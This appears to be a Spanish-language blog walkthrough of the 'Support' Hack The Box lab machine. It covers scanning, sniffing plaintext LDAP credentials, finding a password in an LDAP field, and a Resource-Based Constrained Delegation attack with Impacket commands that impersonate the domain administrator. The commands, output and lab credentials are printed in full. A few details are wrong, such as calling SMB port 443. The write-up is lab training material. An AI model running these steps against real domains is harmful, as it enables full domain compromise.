---
title: "Support (Easy)"
date: 2026-01-13
author: "Isma"
tags: ["Windows"]
slug: "support"
draft: false
---


# Scan


```powershell
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-26 16:39:41Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19155/tcp): CLEAN (Timeout)
|   Check 2 (port 37046/tcp): CLEAN (Timeout)
|   Check 3 (port 25972/udp): CLEAN (Timeout)
|   Check 4 (port 12574/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 5s
| smb2-time: 
|   date: 2025-12-26T16:40:34
|_  start_date: N/A
```


Puerto 443 SMB:


Se puede entrar con null session.


![Imagen del post](/images/notion/2e7888fa-f353-8068-aea3-c601dc4e36a7.png)


![Imagen del post](/images/notion/2e7888fa-f353-80c1-8a62-d91125cc9722.png)


Nos llevamos todas esas tools para analisis.


Llama la atención el  archivo UserInfo.exe, lo descomprimimos, vemos algunas dll’s y archivos de configuración, los analizamos con “strings” pero nada de momento…


Tenemos que instalarnos Powershell para poder analizar y ejecutar el Binario desde nuestra Kali.


Instalamos mono.


```powershell
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe -find 

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user                      

'-find' is not recognized as a valid command or option.

Did you mean: 
        find

                                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe find  
[-] At least one of -first or -last is required.
                                                                                                                                                                                                                 
┌──(root㉿kali)-[/home/…/Desktop/HTB/Support/loot]
└─# mono UserInfo.exe find -first lala  
[-] Exception: Connect Error
```


Vemos que tenemos un error de connexion, abrimos WireShark y analizamos el error.


![Imagen del post](/images/notion/2e7888fa-f353-80a2-9911-db18444f20db.png)


Nos falta asignar el nombre de dominio a la IP para que el DNS resuelva.


Vemos que el binario UserInfo.exe se intenta comunicar con el servidor mediante el usuario ldap


![Imagen del post](/images/notion/2e7888fa-f353-80f3-b919-f11fcdc5ac33.png)


El problema es que las credenciales se envian en texto plano, asi que tenemos las primeras credenciales.


ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz


![Imagen del post](/images/notion/2e7888fa-f353-809d-a8b6-e687ba095d23.png)


Bien! Tenemos el primer user de dominio.


Enumeramos con Bloodhound.


![Imagen del post](/images/notion/2e7888fa-f353-803c-b3ce-f921b4ceb5cb.png)


No tenemos nada de info, pero lo más extraño es el user support.htb


![Imagen del post](/images/notion/2e7888fa-f353-808f-8e7c-e6ca43ccc88c.png)


Ya que esta en un grupo que no es default.


```powershell
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' > ldap.out
```


Con esto podemos enumerar mediante LDAP, extraer más info que no nos daria bloodhound, como por ejemplo el field ‘info’ de un usuario, como el siguiente, donde tenemos una plain cred.


![Imagen del post](/images/notion/2e7888fa-f353-80c5-bfc1-f96394a9d81e.png)


support.htb:Ironside47pleasure40Watchful


![Imagen del post](/images/notion/2e7888fa-f353-805f-a01f-f76834589eda.png)


Tenemos user flag.


![Imagen del post](/images/notion/2e7888fa-f353-8000-98a8-db67e2aaa6a7.png)


Tenemos este esquema para llegar a Domain Admin.


Seguimos los pasos para explotar desde bloodhound


Resource-Based Constrained Delegation


First,if an attacker does not control an account with an SPN set, a new 
attacker-controlled computer account can be added with Impacket's 
addcomputer.py example script:


```plain text
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
```


We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:


```plain text
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'
```


And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.


```plain text
getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
```


This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.



El **Resource-Based Constrained Delegation (RBCD)** es un ataque que aprovecha una característica de Active Directory para "engañar" a un servidor y hacer que nos deje entrar como si fuéramos el Administrador.


### 1. Crear un "Cómplice" (La Cuenta de Computadora)


Normalmente, un usuario normal no puede delegar permisos. Pero las **cuentas de computadora** sí pueden.

- **Qué haces:** Creas una cuenta nueva en el dominio (ej. `ATTACKERSYSTEM$`).
- **Por qué:** Necesitas un objeto que tenga permisos especiales de Kerberos para pedir tickets en nombre de otros.

---


### 2. Convencer al Objetivo de que "Confíe" en ti


Ahora le dices al servidor que quieres atacar (el Target) que tu cuenta nueva (`ATTACKERSYSTEM$`) tiene permiso para hablar en nombre de cualquier usuario.

- **Qué haces:** Usas `rbcd.py` para escribir en un atributo del servidor objetivo llamado `msDS-AllowedToDelegateToAccount`.
- **El resultado:** El servidor objetivo ahora dice: _"Confío en lo que ATTACKERSYSTEM$ me diga sobre quién es el usuario"_.

---


### 3. Pedir la "Llave Maestra" (El Ticket)


Ahora que el servidor confía en tu cuenta creada, pides un ticket de acceso diciendo que eres el Administrador.

- **Qué haces:** Usas `getST.py` (Get Service Ticket). Tu cuenta `ATTACKERSYSTEM$` pide un ticket para el servicio (ej. `CIFS` para archivos o `HTTP` para WinRM) del servidor objetivo, **suplantando** al usuario `Administrator`.
- **El premio:** Obtienes un archivo `.ccache` (un ticket de Kerberos).

Comandos utilizados.


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-addcomputer -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.129.230.181 -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6103)
```


```powershell
┌──(root㉿kali)-[/home/kali]
└─# impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/attackersystem$:Summer2018!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
                                                                                                                                                                                                                 
klist   
                                                                                                                                                                                                                 
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```


![Imagen del post](/images/notion/2e7888fa-f353-8030-a1a9-e5afe5793bfe.png)


Lesgo.


![Imagen del post](/images/notion/2e7888fa-f353-806a-b9a4-f5578000b1bf.png)

